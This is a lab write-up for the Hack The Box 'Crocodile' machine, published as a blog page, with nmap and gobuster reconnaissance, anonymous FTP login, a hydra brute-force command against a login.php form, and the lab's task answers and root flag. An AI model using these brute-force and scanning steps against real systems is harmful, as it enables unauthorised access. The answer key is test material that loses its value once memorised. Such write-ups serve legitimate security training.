@@ -1,0 +1,547 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Crocodile - Hack The Box - py-us3r.io</title>
+<meta name="description" content="In this machine, we are taking advantage of FTP anonymous login and exploiting the login anel with Hydra.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="py-us3r.io">
+<meta property="og:title" content="Crocodile - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-crocodile/">
+
+
+  <meta property="og:description" content="In this machine, we are taking advantage of FTP anonymous login and exploiting the login anel with Hydra.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/img2/crocodile.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2025-03-12T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-crocodile/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Py-Us3r",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="py-us3r.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Crocodile - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/img2/images/Dashboard.jpeg" alt="PyUs3r" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">PyUs3r</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, CTF player<br>HackTheBox ATeam
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:pyus3r@gmail.com">
+            <meta itemprop="email" content="pyus3r@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/javier-rieiro-2900b5354" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/Py-Us3r" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Crocodile - Hack The Box">
+    <meta itemprop="description" content="In this machine, we are taking advantage of FTP anonymous login and exploiting the login anel with Hydra.">
+    <meta itemprop="datePublished" content="March 12, 2025">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Crocodile - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2025-03-12T00:00:00+01:00">March 12, 2025 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/img2/Pasted%20image%2020250310120957.png" alt="" /></p>
+<h2 id="introduction">Introduction</h2>
+
+<blockquote>
+  <p>In this machine, we are taking advantage of FTP anonymous login and exploiting the login anel with Hydra.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<ol>
+  <li>Connectivity
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.129.1.15
+</code></pre></div>    </div>
+  </li>
+  <li>Nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.1.15
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310122012.png" alt="" /></p>
+  </li>
+  <li>Vulnerability scanning with nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,80 10.129.1.15
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310122217.png" alt="" /></p>
+  </li>
+  <li>Fuzzing with gobuster
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.129.1.15/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">--add-slash</span> <span class="nt">-t</span> 100
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310123251.png" alt="" /></p>
+    <h2 id="exploitation">Exploitation</h2>
+  </li>
+  <li>Login FTP with anonymous user
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.129.1.15
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310122549.png" alt="" /></p>
+    <blockquote>
+      <p>Password –&gt; anonymous</p>
+    </blockquote>
+  </li>
+  <li>Brute forcing login pannel with hydra</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Check the pannel login request 
+<img src="/img2/Pasted%20image%2020250310123726.png" alt="" />
+<img src="/img2/Pasted%20image%2020250310123820.png" alt="" /></p>
+  </li>
+  <li>
+    <p>Run attack with hydra</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> allowed.userlist <span class="nt">-P</span> allowed.userlist.passwd 10.129.1.15 http-post-form <span class="s2">"/login.php:Username=^USER^&amp;Password=^PASS^&amp;Submit=Login:F=Warning</span><span class="se">\!</span><span class="s2">"</span>
+</code></pre></div>    </div>
+    <p><img src="/img2/Pasted%20image%2020250310125148.png" alt="" /></p>
+    <h2 id="tasks">Tasks</h2>
+  </li>
+</ul>
+
+<ol>
+  <li>What Nmap scanning switch employs the use of default scripts during a scan?
+    <blockquote>
+      <p>-sC</p>
+    </blockquote>
+  </li>
+  <li>What service version is found to be running on port 21?
+    <blockquote>
+      <p>vsftpd 3.0.3</p>
+    </blockquote>
+  </li>
+  <li>What FTP code is returned to us for the “Anonymous FTP login allowed” message?
+    <blockquote>
+      <p>230</p>
+    </blockquote>
+  </li>
+  <li>After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?
+    <blockquote>
+      <p>anonymous</p>
+    </blockquote>
+  </li>
+  <li>After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?
+    <blockquote>
+      <p>get</p>
+    </blockquote>
+  </li>
+  <li>What is one of the higher-privilege sounding usernames in ‘allowed.userlist’ that we download from the FTP server?
+    <blockquote>
+      <p>admin</p>
+    </blockquote>
+  </li>
+  <li>What version of Apache HTTP Server is running on the target host?
+    <blockquote>
+      <p>Apache httpd 2.4.41</p>
+    </blockquote>
+  </li>
+  <li>What switch can we use with Gobuster to specify we are looking for specific filetypes?
+    <blockquote>
+      <p>-x</p>
+    </blockquote>
+  </li>
+  <li>Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?
+    <blockquote>
+      <p>login.php</p>
+    </blockquote>
+  </li>
+  <li>Submit root flag
+    <blockquote>
+      <p>c7110277ac44d78b6a9fff2232434d16</p>
+    </blockquote>
+  </li>
+</ol>
+
+<p><img src="/img2/Pasted%20image%2020250310125709.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ftp" class="page__taxonomy-item" rel="tag">ftp</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#very-easy" class="page__taxonomy-item" rel="tag">Very Easy</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2025-03-12T00:00:00+01:00">March 12, 2025</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-appointment/" class="pagination--pager" title="Appointment - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-dancing/" class="pagination--pager" title="Dancing - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2025 Py-Us3r</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
